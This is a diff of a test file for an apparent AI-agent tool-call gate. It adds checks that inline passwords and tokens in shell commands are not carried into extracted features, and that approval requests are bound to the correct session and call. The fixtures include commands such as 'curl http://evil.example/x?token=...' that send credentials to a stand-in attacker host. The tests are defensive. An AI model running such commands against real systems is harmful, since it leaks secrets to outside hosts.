@@ -1186,6 +1186,10 @@ test('an inline credential has no second door: no path, program, redirect or arg
     { command: 'curl x/y?token=abcd1234', expectPaths: [] },
     { command: 'curl /api/v1?token=abcd1234', expectPaths: [] },
     { command: 'cmd /c "curl http://evil.example/x?token=abcd1234"', expectPaths: [] },
+    // The three r2 repros, byte for byte: a cluster that carries a body, a body behind `--`, and a
+    // quoted sentence whose URL holds a token.
+    { command: 'bash -lc "curl --password=TOPSECRET42 https://y.example"', expectPaths: [], expectFlags: ['-lc'] },
+    { command: 'bash -c -- "curl --password=TOPSECRET42 https://y.example"', expectPaths: [] },
     { command: 'sudo PGPASSWORD=abcd/1234 psql -h db', expectPaths: [] },
     { command: 'find . -exec "curl http://x?token=abcd1234" \\;', expectPrograms: [] },
     { command: 'curl x > /tmp/out?token=abcd1234', expectRedirects: [] },
@@ -1198,11 +1202,26 @@ test('an inline credential has no second door: no path, program, redirect or arg
       scope: { workspaceRef: WORKSPACE },
     })
     assert.equal(JSON.stringify(features).includes('abcd1234'), false, item.command)
+    assert.equal(JSON.stringify(features).includes('TOPSECRET42'), false, item.command)
+    if (item.expectFlags !== undefined) assert.deepEqual(features.shell.flags, item.expectFlags, item.command)
     assert.equal(features.truncated, true, item.command)
     if (item.expectPaths !== undefined) assert.deepEqual(features.shell.paths, item.expectPaths, item.command)
     if (item.expectPrograms !== undefined) assert.deepEqual(features.shell.programs, item.expectPrograms, item.command)
     if (item.expectRedirects !== undefined) assert.deepEqual(features.shell.redirects, item.expectRedirects, item.command)
   }
+
+  // A quoted sentence that is no path candidate is not a place either: `echo "visit …?token=…"`
+  // keeps no path and the token does not travel. It is marked short, because a word was dropped
+  // on the way rather than kept: the sentence is a body, and bodies are not carried.
+  const echoed = callFeatures({
+    tool: 'bash',
+    args: { command: 'echo "visit http://x?token=abcd1234"' },
+    base: WORKSPACE,
+    scope: { workspaceRef: WORKSPACE },
+  })
+  assert.equal(JSON.stringify(echoed).includes('abcd1234'), false)
+  assert.deepEqual(echoed.shell.paths, [])
+  assert.equal(echoed.truncated, true)
 
   // A structured path may hold spaces, but a query in it is an endpoint, not a place.
   const written = callFeatures({
@@ -1271,6 +1290,41 @@ test('a card that names no call is bound to the call that was waiting for it', a
   assert.equal(records.length, 1)
   const story = whyOf({ rows, records, callId: 'call_31' })
   assert.equal(story.projection.outcome, 'approved-by-human')
+  rmSync(home, { recursive: true, force: true })
+})
+
+test('a card is bound inside its own Session, not to whichever call waited first', async () => {
+  const home = tempHome()
+  const adaptor = adaptorOf({ home, config: { mode: 'enforce' }, fetchImpl: okFetch('human-needed') })
+  const first = execOf({ name: 'read_own_chat', args: { query: 'a' }, sessionId: 'sess_chat', callId: 'call_a' })
+  const second = execOf({ name: 'read_own_chat', args: { query: 'b' }, sessionId: 'sess_group', callId: 'call_b' })
+  adaptor.hostEvent({ id: 'sess_chat' }, { type: 'tool/call', data: { callId: 'call_a', name: 'read_own_chat' } })
+  adaptor.hostEvent({ id: 'sess_group' }, { type: 'tool/call', data: { callId: 'call_b', name: 'read_own_chat' } })
+  assert.equal((await adaptor.gate(first)).kind, 'ask')
+  assert.equal((await adaptor.gate(second)).kind, 'ask')
+  // The card in the group Session names no call; it belongs to that Session's call, not the oldest one.
+  adaptor.hostEvent({ id: 'sess_group' }, { type: 'approval/asked', data: { id: 'ap_b', toolName: 'read_own_chat' } })
+  await adaptor.close()
+  const asked = readHostLog(adaptor.hostLogPath).find(row => row.type === 'approval/asked')
+  assert.equal(asked.session_id, 'sess_group')
+  assert.equal(asked.call_id, 'call_b')
+  rmSync(home, { recursive: true, force: true })
+})
+
+test('an ask that names its call leaves nothing for the next card', async () => {
+  const home = tempHome()
+  const adaptor = adaptorOf({ home, config: { mode: 'enforce' }, fetchImpl: okFetch('human-needed') })
+  const first = execOf({ name: 'read_own_chat', args: { query: 'a' }, sessionId: 'sess_chat', callId: 'call_a' })
+  const second = execOf({ name: 'read_own_chat', args: { query: 'b' }, sessionId: 'sess_chat', callId: 'call_b' })
+  assert.equal((await adaptor.gate(first)).kind, 'ask')
+  assert.equal((await adaptor.gate(second)).kind, 'ask')
+  // The host names this card's call itself; the entry it would have needed is dropped, so the
+  // next anonymous card cannot take it.
+  adaptor.hostEvent({ id: 'sess_chat' }, { type: 'approval/asked', data: { id: 'ap_b', toolName: 'read_own_chat', callId: 'call_b' } })
+  adaptor.hostEvent({ id: 'sess_chat' }, { type: 'approval/asked', data: { id: 'ap_a', toolName: 'read_own_chat' } })
+  await adaptor.close()
+  const asked = readHostLog(adaptor.hostLogPath).filter(row => row.type === 'approval/asked')
+  assert.deepEqual(asked.map(row => row.call_id), ['call_b', 'call_a'])
   rmSync(home, { recursive: true, force: true })
 })
 
